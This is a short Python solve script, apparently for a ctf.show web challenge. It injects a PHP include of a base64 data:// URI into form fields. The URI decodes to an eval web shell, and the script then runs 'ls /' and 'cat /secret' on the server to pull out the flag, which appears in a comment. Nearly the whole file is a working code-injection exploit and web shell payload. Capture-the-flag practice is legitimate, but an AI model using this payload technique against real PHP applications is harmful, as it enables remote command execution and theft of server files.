import re
import requests

url = "http://47fd597b-18ab-4b77-a43c-b202431a2735.challenge.ctf.show/"
data={
    "num1":'include "data://text',
    "symbol":"/",
    "num2":'plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8+";',
    "shell":'system("ls /");'
}
# r = requests.post(url=url,data=data)
# print(r.text)
# bin dev etc home lib media mnt opt proc root run sbin secret srv sys tmp usr var
data["shell"] = 'system("cat /secret");'
r = requests.post(url=url,data=data)
# print(r.text)
flag_match = re.search(r'ctfshow\{[0-9a-z\-]+\}', r.text)
if flag_match:
    flag = flag_match.group(0)
    print(f"Flag found!\n{flag}")
# ctfshow{57a4b546-1616-4aec-be7f-2e0c374e49c4}